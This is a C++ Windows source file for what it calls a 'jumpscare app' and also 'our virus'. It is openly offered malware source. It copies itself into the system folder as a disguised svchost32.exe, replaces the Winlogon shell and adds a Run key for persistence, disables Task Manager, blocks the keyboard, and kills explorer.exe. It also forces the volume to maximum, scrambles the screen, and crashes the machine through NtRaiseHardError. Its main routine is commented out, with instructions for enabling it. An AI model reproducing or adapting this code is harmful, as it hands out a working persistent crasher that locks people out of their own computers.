/*
these are very chaotic Lol DO NOT RUN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
MAIN FUNCTION IS COMMENTED in order to prevent accidents

what this does:
videos on screen shaking moving
color manipulation eating screen and stuff
error icons
VERY LOUD BEEP
CRASHES

0) DISABLES TASQUE MANAGER and keyboard - SETS ITSELF TO RUN AT STARTUP - EXPLORER IS DEAD
1) plays looping videos that shake and move around the screen
2) screen is jumbled and colors inverted
3) error icons on the screen drawn randomly
4) some other cool stuff It Seems
5) VERY LOUD BEEP THAT GOES BEEEEEEEEEEEEEEEEEEEEEP
6) the computer is crashed.

AND YES THE PC VOLUME IS ALWAYS SET TO 100% NO MATTER WHAT AND USER cannot decrease it Lol
so please use a loud video

this is meant to be a jumpscare app
*/

// WRITTEN ONLY USING THE FINEST Windows.H shit
// MCI is some stuff used in Windows 95 and 98 Lol

// this could have been broken up in multiple files for cleanliness (and Good Code(tm)) but Ehhhh

#include <windows.h>
#include <string>
#include <mmsystem.h>
#include <vector>
#include <random>
#include <ctime>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <iostream>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <WinReg.h>
#include <tlhelp32.h>
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "winmm.lib")

constexpr int NUM_VIDEOS = 25;       // nr videos (25 seems to be the max amount of videos idk why)
constexpr int SHAKE_INTERVAL = 20;  // ms between shakes
constexpr int SHAKE_AMOUNT = 250;    // max px movement per shake
constexpr int INVERSION_INTERVAL = 50; // ms for screen inversion repeat

HICON ErrorIcon = LoadIcon(NULL, IDI_ERROR);
HICON ExclamationIcon = LoadIcon(NULL, IDI_EXCLAMATION);

// video file needs to be .avi file
// also needs to be compressed like this:
// ./ffmpeg -i originalvideo.mp4 -c:v msvideo1 -c:a pcm_s16le video.avi
// OTHERWISE it will not work

// yes we can kill the explore and maybe disable task manager but it's easier to just block these apps

const wchar_t* processNames[2] = {
    L"explorer.exe",
    L"taskmgr.exe"
};

bool IsProcessRunning(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, processName.c_str())) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return false;
}

bool KillProcessByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    bool success = false;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, processName.c_str())) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 1)) {
                        success = true;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return success;
}

struct VideoWindow {
    HWND hWnd;
    std::wstring alias;
    int baseX, baseY;
};

std::vector<VideoWindow> g_windows;
std::wstring g_videoPath;
std::mt19937 rng((unsigned)time(NULL)); // random seed

std::wstring ExtractEmbeddedVideo() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring destPath = std::wstring(tempPath) + L"video.avi";

    HRSRC hRes = FindResource(NULL, L"VIDEO_AVI", RT_RCDATA);
    if (!hRes) {
        //MessageBoxW(NULL, L"video resource error CAN'T FIND", L"Error", MB_ICONERROR);
        return L"";
    }

    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (!hResLoad) {
        //MessageBoxW(NULL, L"failed 2 load video resource", L"Error", MB_ICONERROR);
        return L"";
    }

    DWORD size = SizeofResource(NULL, hRes);
    void* pData = LockResource(hResLoad);
    if (!pData) {
        //MessageBoxW(NULL, L"could not lock resource file", L"Error", MB_ICONERROR);
        return L"";
    }

    HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        //MessageBoxW(NULL, L"failed to create video file in temp folder", L"Error", MB_ICONERROR);
        return L"";
    }

    DWORD written;
    WriteFile(hFile, pData, size, &written, NULL);
    CloseHandle(hFile);

    return destPath;
}

void checkMciError(MCIERROR err, const wchar_t* what, const std::wstring& alias) {
    if (err != 0) {
        wchar_t errorText[256];
        mciGetErrorString(err, errorText, 256);
        //MessageBoxW(NULL, (std::wstring(what) + L" [" + alias + L"]: " + errorText).c_str(), L"MCI error", MB_ICONERROR);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == MM_MCINOTIFY && wParam == MCI_NOTIFY_SUCCESSFUL) {
        for (const auto& win : g_windows) {
            if (win.hWnd == hWnd) {
                mciSendString((L"close " + win.alias).c_str(), NULL, 0, NULL);
                break;
            }
        }
        PostQuitMessage(0);
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int RandomOffset(int base, int range) {
    std::uniform_int_distribution<int> dist(-range, range);
    return base + dist(rng);
}

struct WindowSpec {
    int x, y, w, h;
};

WindowSpec RandomScreenPositionAndSize() {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    std::uniform_int_distribution<int> sizeW(200, screenW / 2 + 200);
    std::uniform_int_distribution<int> sizeH(200, screenH / 2 + 200);
    int w = sizeW(rng);
    int h = sizeH(rng);

    std::uniform_int_distribution<int> posX(0, screenW - w);
    std::uniform_int_distribution<int> posY(0, screenH - h);
    int x = posX(rng);
    int y = posY(rng);

    return { x - rand() % 150, y - rand() % 150, w + rand() % 150, h + rand() % 150 };
}

void ShakeWindows() {
    for (auto& win : g_windows) {
        RECT rect;
        GetWindowRect(win.hWnd, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;

        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);

        std::uniform_int_distribution<int> posX(0, screenW - w);
        std::uniform_int_distribution<int> posY(0, screenH - h);
        int x = posX(rng);
        int y = posY(rng);

        SetWindowPos(win.hWnd, HWND_TOPMOST, x, y, w, h, SWP_NOZORDER | SWP_SHOWWINDOW);

        std::wstring putCmd = L"put " + win.alias + L" destination at 0 0 " +
            std::to_wstring(w) + L" " + std::to_wstring(h);
        mciSendString(putCmd.c_str(), NULL, 0, NULL);
    }
}

void InvertScreen() {
    HDC hdc = GetDC(NULL);
    if (hdc) {
        // color inversion
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}

void CreateVideoWindow(HINSTANCE hInstance, int index) {
    std::wstring className = L"JumpScareClass" + std::to_wstring(index);
    std::wstring alias = L"jumpscare" + std::to_wstring(index);

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className.c_str();
    RegisterClass(&wc);

    WindowSpec spec = RandomScreenPositionAndSize();

    HWND hWnd = CreateWindowEx(WS_EX_TOPMOST, className.c_str(), NULL,
        WS_POPUP, spec.x, spec.y, spec.w, spec.h,
        NULL, NULL, hInstance, NULL);
    ShowWindow(hWnd, SW_SHOW);
    SetForegroundWindow(hWnd);
    SetFocus(hWnd);

    std::wstring openCmd = L"open \"" + g_videoPath + L"\" type avivideo alias " + alias;
    std::wstring windowCmd = L"window " + alias + L" handle " + std::to_wstring((uintptr_t)hWnd);
    std::wstring playCmd = L"play " + alias + L" notify";

    checkMciError(mciSendString(openCmd.c_str(), NULL, 0, NULL), L"open", alias);
    checkMciError(mciSendString(windowCmd.c_str(), NULL, 0, NULL), L"window", alias);
    checkMciError(mciSendString(playCmd.c_str(), NULL, 0, hWnd), L"play", alias);

    g_windows.push_back({ hWnd, alias, spec.x, spec.y });
}

void SetVolumeToMax() {
    CoInitialize(NULL);

    IMMDeviceEnumerator* deviceEnumerator = nullptr;
    IMMDevice* defaultDevice = nullptr;
    IAudioEndpointVolume* endpointVolume = nullptr;

    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL,
        CLSCTX_ALL, __uuidof(IMMDeviceEnumerator),
        (void**)&deviceEnumerator))) {

        if (SUCCEEDED(deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice))) {

            if (SUCCEEDED(defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
                CLSCTX_ALL, NULL, (void**)&endpointVolume))) {

                endpointVolume->SetMute(FALSE, NULL);
                endpointVolume->SetMasterVolumeLevelScalar(1.0f, NULL); // 1.0 = 100%
                endpointVolume->Release();
            }
            defaultDevice->Release();
        }
        deviceEnumerator->Release();
    }

    CoUninitialize();
}

void CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD) {
    SetVolumeToMax();
    ShakeWindows();
    InvertScreen();
}


DWORD WINAPI VideoThread(LPVOID lpParam) {
    HINSTANCE hInstance = (HINSTANCE)lpParam;

    for (int i = 0; i < NUM_VIDEOS; ++i) {
        SetVolumeToMax();
        CreateVideoWindow(hInstance, i);
    }

    while (true) {
        ShakeWindows();
        SetVolumeToMax();
        Sleep(SHAKE_INTERVAL);
    }

    return 0;
}

DWORD WINAPI InversionThread(LPVOID) {
    while (true) {
        InvertScreen();
        Sleep(INVERSION_INTERVAL);
    }
    return 0;
}

// replace shell and set startup
void SuperCool() {
    // replace Windows shell with our virus
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // copy exe to a more permanent location
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    std::wstring targetPath = std::wstring(systemDir) + L"\\svchost32.exe"; // disguised name Sssssshhhhh
    CopyFileW(exePath, targetPath.c_str(), FALSE);

    // set as shell
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (BYTE*)targetPath.c_str(),
            (wcslen(targetPath.c_str()) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // add to startup (redundant but ensures multiple paths to execution) (also who cares how many times this is ran lol)
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SystemServices", 0, REG_SZ, (BYTE*)targetPath.c_str(),
            (wcslen(targetPath.c_str()) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // disable Task Manager
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    }
    if (hKey) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}

// disable keyboard hooks
void DisableKeyboard() {
    // this is a low level hook that blocks all keys
    SetWindowsHookExW(WH_KEYBOARD_LL, [](int code, WPARAM wParam, LPARAM lParam) -> LRESULT {
        // intercept any keys that are used to run stuff
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (code == HC_ACTION) {
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) ||
                (GetAsyncKeyState(VK_MENU) & 0x8000) ||
                (GetAsyncKeyState(VK_LWIN) & 0x8000) ||
                (GetAsyncKeyState(VK_RWIN) & 0x8000) ||
                kbStruct->vkCode == VK_ESCAPE ||
                kbStruct->vkCode == VK_TAB ||
                kbStruct->vkCode == VK_DELETE) {
                return 1; // block these keys
            }
        }
        return CallNextHookEx(NULL, code, wParam, lParam);
        }, NULL, 0);
}

// move mouse randomly
DWORD WINAPI RandomMouseThread(LPVOID) {
    std::mt19937 rng((unsigned)time(NULL));
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        std::uniform_int_distribution<int> distX(0, screenW);
        std::uniform_int_distribution<int> distY(0, screenH);

        // move mouse to random position
        SetCursorPos(distX(rng), distY(rng));

        // random intervals
        std::uniform_int_distribution<int> sleepDist(50, 500);
        Sleep(sleepDist(rng));
    }
}

// square wave beep function
void playSquareWave(int frequency, int duration) {
    const int sampleRate = 44100;
    const int waveLength = sampleRate / frequency;
    int numSamples = duration * sampleRate / 1000;
    BYTE* audioData = new BYTE[numSamples];
    for (int i = 0; i < numSamples; ++i) {
        if ((i / waveLength) % 2 == 0) {
            audioData[i] = 255;
        }
        else {
            audioData[i] = 0;
        }
    }
    WAVEFORMATEX waveFormat = { 0 };
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = 1;
    waveFormat.nSamplesPerSec = sampleRate;
    waveFormat.wBitsPerSample = 8;
    waveFormat.nBlockAlign = 1;
    waveFormat.nAvgBytesPerSec = sampleRate;
    WAVEHDR waveHeader = { 0 };
    waveHeader.lpData = (LPSTR)audioData;
    waveHeader.dwBufferLength = numSamples;
    HWAVEOUT hWaveOut;
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        delete[] audioData;
        return;
    }
    waveOutPrepareHeader(hWaveOut, &waveHeader, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &waveHeader, sizeof(WAVEHDR));
    Sleep(duration);
    waveOutUnprepareHeader(hWaveOut, &waveHeader, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] audioData;
}

// crash the computer
void CrashComputer() {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

// thread to handle the delayed beep and crash
DWORD WINAPI DelayedCrashThread(LPVOID) {
    // Hold on...
    Sleep(5000);

    SetVolumeToMax();
    // play the beep
    playSquareWave(1500, 5000);

    // crash the computer
    CrashComputer();

    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        return 1;
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// no keyboard
DWORD WINAPI KeyboardThread(LPVOID) {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook != NULL) {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    return 0;
}

DWORD WINAPI RandomIconThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    while (true) {
        for (int i = 0; i < 35; ++i) {
            int x = std::rand() % screenWidth;
            int y = std::rand() % screenHeight;
            DrawIcon(hdc, x, y, ExclamationIcon);
        }
        Sleep(INVERSION_INTERVAL / 2);
    }

    ReleaseDC(NULL, hdc);
}

DWORD WINAPI CursorIconThread(LPVOID) {
    HDC hdc = GetDC(NULL);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    while (true) {
        for (int i = 0; i < 35; ++i) {
            int x = std::rand() % screenWidth;
            int y = std::rand() % screenHeight;
            DrawIcon(hdc, x, y, ErrorIcon);
        }
        Sleep(INVERSION_INTERVAL / 2);
    }

    ReleaseDC(NULL, hdc);
}

// The Humble WinMain function

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    MessageBoxW(NULL, L"Wooahh there, don't forget to uncomment the True WinMain in the code if you really want to Lol", NULL, MB_ICONINFORMATION);
    return 0;
}

//////////////////////////////////// UNCOMMENT ALL OF THIS

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
//    g_videoPath = ExtractEmbeddedVideo();
//
//    std::random_device rd;
//    std::mt19937 gen(rd());  // this will ensure a great seed! Yaayyy
//
//    std::uniform_int_distribution<> d1(0, 2570);
//    std::uniform_int_distribution<> d2(997, 1169);
//    std::uniform_int_distribution<> d3(0, 110);
//
//    Sleep(d1(gen) + d2(gen) + d3(gen));
//
//    SuperCool();
//    DisableKeyboard();
//
//    // Create threads
//    HANDLE hVideoThread = CreateThread(NULL, 0, VideoThread, hInstance, 0, NULL);
//    Sleep(300);
//    HANDLE hInvertThread = CreateThread(NULL, 0, InversionThread, NULL, 0, NULL);
//    HANDLE hMouseThread = CreateThread(NULL, 0, RandomMouseThread, NULL, 0, NULL);
//    HANDLE hCrashThread = CreateThread(NULL, 0, DelayedCrashThread, NULL, 0, NULL);
//    HANDLE hKeyboardThread = CreateThread(NULL, 0, KeyboardThread, NULL, 0, NULL);
//    HANDLE hIconThread = CreateThread(NULL, 0, RandomIconThread, NULL, 0, NULL);
//    HANDLE hIconCursorThread = CreateThread(NULL, 0, CursorIconThread, NULL, 0, NULL);
//
//    // message loop for MCI notifications
//    MSG msg;
//    while (GetMessage(&msg, NULL, 0, 0)) {
//        for (const wchar_t* i : processNames) {
//            if (IsProcessRunning(i)) {
//                KillProcessByName(i);
//            }
//        }
//
//        TranslateMessage(&msg);
//        DispatchMessage(&msg);
//    }
//    return 0;
//}